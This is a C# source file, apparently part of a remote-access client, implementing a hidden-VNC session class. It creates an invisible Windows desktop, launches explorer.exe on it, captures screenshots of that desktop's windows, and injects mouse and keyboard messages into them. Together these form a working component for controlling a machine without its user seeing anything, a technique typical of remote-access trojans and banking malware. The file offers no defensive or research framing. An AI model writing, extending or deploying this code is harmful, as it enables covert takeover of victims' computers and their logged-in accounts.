using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;
using IWshRuntimeLibrary;

namespace winClient48
{
    public class clsfnHvncSession : IDisposable
    {
        private IntPtr m_hDesktop;
        private string m_szDesktopName;
        private IntPtr m_hLastWnd;
        private bool m_disposed = false;

        private const uint GENERIC_ALL = 0x10000000;
        private const int UOI_NAME = 2;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;
        private const int SW_MAXIMIZE = 3;
        private const uint PW_RENDERFULLCONTENT = 0x00000002;

        public clsfnHvncSession(string szDesktopName)
        {
            m_szDesktopName = szDesktopName;
            m_hDesktop = WinAPI.CreateDesktop(szDesktopName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);

            if (m_hDesktop == IntPtr.Zero)
                throw new Exception("Create window failed.");
        }

        public void fnStartExplorer()
        {
            WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = m_szDesktopName;
            si.dwFlags = 0x00000001;
            si.wShowWindow = (short)SW_MAXIMIZE;

            WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

            StringBuilder sb = new StringBuilder("explorer.exe /separate");

            bool success = WinAPI.CreateProcess(
                null,
                sb,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (success)
            {
                WinAPI.CloseHandle(pi.hProcess);
                WinAPI.CloseHandle(pi.hThread);
            }
        }

        public Bitmap fnGetScreenshot(int nWidth, int nHeight)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            Bitmap bmp = new Bitmap(nWidth, nHeight, PixelFormat.Format32bppPArgb);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.FromArgb(45, 45, 45)); // 背景色
                IntPtr hdc = g.GetHdc();

                List<IntPtr> windowList = new List<IntPtr>();

                WinAPI.EnumDesktopWindows(m_hDesktop, (hWnd, lParam) =>
                {
                    if (WinAPI.IsWindowVisible(hWnd))
                    {
                        windowList.Add(hWnd);
                    }
                    return true;
                }, IntPtr.Zero);

                windowList.Reverse();

                foreach (IntPtr hWnd in windowList)
                {
                    WinAPI.PrintWindow(hWnd, hdc, PW_RENDERFULLCONTENT);
                }

                g.ReleaseHdc(hdc);
            }
            return bmp;
        }

        public void fnHandleMouseInput(string type, int x, int y)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            IntPtr hWnd = WinAPI.WindowFromPoint(x, y);
            if (hWnd == IntPtr.Zero) return;

            m_hLastWnd = hWnd;
            Point p = new Point(x, y);
            WinAPI.ScreenToClient(hWnd, ref p);
            IntPtr lParam = (IntPtr)((p.Y << 16) | (p.X & 0xFFFF));

            switch (type.ToUpper())
            {
                case "MOVE":
                    WinAPI.PostMessage(hWnd, 0x0200, IntPtr.Zero, lParam);
                    break;
                case "LD":
                    WinAPI.SetForegroundWindow(hWnd);
                    WinAPI.PostMessage(hWnd, 0x0006, (IntPtr)1, IntPtr.Zero); // WM_ACTIVATE
                    WinAPI.SetFocus(hWnd);
                    WinAPI.PostMessage(hWnd, 0x0201, (IntPtr)1, lParam);
                    break;
                case "LU":
                    WinAPI.PostMessage(hWnd, 0x0202, IntPtr.Zero, lParam);
                    break;
                case "RD":
                    WinAPI.PostMessage(hWnd, 0x0204, (IntPtr)2, lParam);
                    break;
                case "RU":
                    WinAPI.PostMessage(hWnd, 0x0205, IntPtr.Zero, lParam);
                    break;
            }
        }

        public void fnHandleKeyboardInput(string action, int vk)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);
            IntPtr hWnd = (m_hLastWnd != IntPtr.Zero) ? m_hLastWnd : WinAPI.GetForegroundWindow();

            if (hWnd != IntPtr.Zero)
            {
                uint scanCode = WinAPI.MapVirtualKey((uint)vk, 0);
                uint lParam;

                if (action.ToLower() == "down")
                {
                    lParam = 0x00000001 | (scanCode << 16);
                    WinAPI.PostMessage(hWnd, 0x0100, (IntPtr)vk, (IntPtr)lParam);

                    if (IsTextKey(vk))
                    {
                        WinAPI.PostMessage(hWnd, 0x0102, (IntPtr)vk, (IntPtr)lParam);
                    }
                }
                else
                {
                    lParam = 0xC0000001 | (scanCode << 16);
                    WinAPI.PostMessage(hWnd, 0x0101, (IntPtr)vk, (IntPtr)lParam);
                }
            }
        }

        private bool IsTextKey(int vk) => (vk >= 65 && vk <= 90) || (vk >= 48 && vk <= 57) || vk == 32 || vk == 13;

        public void Dispose()
        {
            if (!m_disposed)
            {
                if (m_hDesktop != IntPtr.Zero)
                    WinAPI.CloseDesktop(m_hDesktop);
                m_disposed = true;
            }
        }
    }
}
